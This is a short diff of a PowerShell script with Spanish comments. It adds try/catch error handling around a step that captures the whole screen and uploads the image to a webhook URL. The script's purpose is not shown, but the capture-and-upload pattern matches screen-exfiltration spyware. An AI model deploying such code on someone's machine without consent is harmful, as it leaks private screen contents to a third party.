@@ -19,8 +19,12 @@ function CaptureAndSendScreenshot {
     $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
     $bitmap.Save($screenshotFile, [System.Drawing.Imaging.ImageFormat]::Png)
 
-    # Envío de la captura de pantalla al webhook
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -InFile $screenshotFile
+    try {
+        # Envío de la captura de pantalla al webhook
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -InFile $screenshotFile -ErrorAction Stop
+    } catch {
+        Write-Host "Ocurrió un error al intentar enviar la captura de pantalla al webhook: $_"
+    }
 }
 
 # Ejecutar la función de captura de pantalla una vez
